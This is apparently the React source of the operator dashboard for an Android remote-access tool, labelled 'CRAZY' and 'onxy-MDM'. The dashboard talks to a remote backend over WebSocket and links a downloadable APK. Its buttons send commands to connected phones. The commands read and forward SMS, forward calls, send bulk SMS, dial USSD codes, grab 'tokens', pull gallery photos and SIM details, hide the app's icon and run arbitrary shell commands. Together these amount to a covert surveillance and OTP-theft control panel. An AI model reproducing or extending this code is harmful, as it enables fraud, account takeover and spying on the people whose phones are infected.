"use client";
import { useState, useEffect, useRef } from 'react';

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState('Home');
  const [devices, setDevices] = useState<any>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [galleryImages, setGalleryImages] = useState<string[]>([]);
  const [simInfo, setSimInfo] = useState<any>(null);
  const ws = useRef<WebSocket | null>(null);

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.device_id) {
          setDevices((prev: any) => ({ ...prev, [data.device_id]: data }));
          if (!selectedDevice) setSelectedDevice(data.device_id);
        }
        if (data.type === 'gallery_response') setGalleryImages(data.images);
        if (data.type === 'sim_info_response') setSimInfo(JSON.parse(data.data));
      } catch (e) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const sendCommand = (command: string, payload: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command, payload }));
      alert(`Command '${command}' Sent!`);
    } else {
      alert("Device not selected or disconnected!");
    }
  };

  const handleLogout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; window.location.href = '/login'; };
  const dev = devices[selectedDevice || ''] || {};

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white font-sans">
      {/* HEADER */}
      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#1A1B23]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-purple-600 flex items-center justify-center text-xl">👤</div>
          <div>
            <h1 className="font-bold text-lg text-purple-400">CRAZY</h1>
            <p className="text-xs text-gray-400">Web Admin</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <a href="/crazy-onxy-MDM/app-debug.apk" download className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold text-sm shadow-lg">⬇ Download APK</a>
          <button onClick={handleLogout} className="text-sm text-red-400 border border-red-500 px-3 py-1 rounded-full hover:bg-red-900">Logout</button>
        </div>
      </header>

      {/* NAVIGATION */}
      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm">
        {['Home', 'Gallery', 'SIM Control', 'Terminal'].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400'}`}>{tab}</button>
        ))}
      </nav>

      <main className="p-4">
        {selectedDevice ? (
          <>
            {/* DEVICE CARD */}
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-xl font-bold">{dev.model || 'vivo (V2518)'} <span className="text-xs bg-green-800 text-green-300 px-2 py-1 rounded ml-2">16</span></h2>
              </div>
              <div className="grid grid-cols-2 gap-y-3 text-sm text-gray-300">
                <div className="flex justify-between pr-4"><span>ID</span> <span className="text-white">{selectedDevice}</span></div>
                <div className="flex justify-between pr-4"><span>IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
              </div>
            </div>

            {/* HOME TAB (8 Buttons + Stealth) */}
            {activeTab === 'Home' && (
              <div className="grid grid-cols-4 gap-3 mb-6">
                {[
                  { label: 'Check Online', icon: '📡', cmd: 'CHECK_ONLINE' },
                  { label: 'GET SMS', icon: '📥', cmd: 'GET_SMS' },
                  { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
                  { label: 'Send SMS', icon: '📤', cmd: 'SEND_SMS' },
                  { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
                  { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
                  { label: 'Dial USSD', icon: '🔢', cmd: 'DIAL_USSD' },
                  { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' },
                  { label: 'Hide Icon', icon: '🕵️', cmd: 'HIDE_ICON' },
                  { label: 'Show Icon', icon: '👁️', cmd: 'SHOW_ICON' }
                ].map((btn, i) => (
                  <button key={i} onClick={() => sendCommand(btn.cmd)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition">
                    <span className="text-2xl">{btn.icon}</span>
                    <span className="text-xs font-semibold text-gray-300">{btn.label}</span>
                  </button>
                ))}
              </div>
            )}

            {/* GALLERY TAB */}
            {activeTab === 'Gallery' && (
              <div className="space-y-4">
                <button onClick={() => sendCommand('GET_GALLERY')} className="bg-blue-600 px-4 py-2 rounded text-sm font-bold">Fetch Photos</button>
                <div className="grid grid-cols-4 gap-2">
                  {galleryImages.map((b64, i) => <img key={i} src={`data:image/jpeg;base64,${b64}`} className="w-full rounded" />)}
                </div>
              </div>
            )}

            {/* SIM CONTROL TAB */}
            {activeTab === 'SIM Control' && (
              <div className="space-y-4">
                <button onClick={() => sendCommand('GET_SIM_INFO')} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Fetch SIM Info</button>
                <pre className="bg-black p-4 rounded text-green-400 text-sm">{simInfo ? JSON.stringify(simInfo, null, 2) : 'No Data'}</pre>
              </div>
            )}

            {/* TERMINAL TAB */}
            {activeTab === 'Terminal' && (
              <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
                <input type="text" id="cmdInput" className="bg-black border border-gray-700 rounded p-2 w-full text-white font-mono mb-2" placeholder="Enter shell command..." />
                <button onClick={() => {
                    const cmd = (document.getElementById('cmdInput') as HTMLInputElement).value;
                    sendCommand('EXECUTE_SHELL', { command: cmd });
                }} className="bg-purple-600 px-4 py-2 rounded">Run</button>
              </div>
            )}
          </>
        ) : <div className="text-center text-gray-500 mt-10">Waiting for device connection...</div>}
      </main>
    </div>
  );
}
